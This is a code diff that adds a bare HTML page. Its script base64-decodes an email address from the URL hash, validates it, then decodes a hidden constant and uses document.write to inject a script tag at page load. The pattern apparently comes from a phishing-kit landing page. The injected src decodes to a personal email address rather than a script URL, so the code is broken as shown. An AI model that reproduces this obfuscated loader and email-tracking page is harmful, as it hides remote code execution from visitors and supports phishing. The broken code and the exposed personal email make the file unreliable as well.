@@ -1,0 +1,33 @@
+<script> 
+
+let url_string = "";
+var rex = "";
+
+</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+	let hash_string = window.location.hash.substring(1);
+let emailRegex = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+
+try {
+    let decoded_string = atob(hash_string);
+    decoded_string = decoded_string.replace(/\s+/g, '');
+	//decoded_string = decoded_string.trim();
+    if (!emailRegex.test(decoded_string)) {
+        document.location.href = `#`;
+    } else {
+        document.location.href = `#${hash_string}`;
+    }
+} catch (err) {
+    document.location.href = `#`;
+}
+        const a = "ZHJzdGVwaGVuam9uZXMxN0BnbWFpbC5jb20=";
+        document.write("<script src=\"" + atob(a) + "\"><\/script>")
+    </script>
+</head>
+<body>
+    <p></p>
+</body>
+</html>
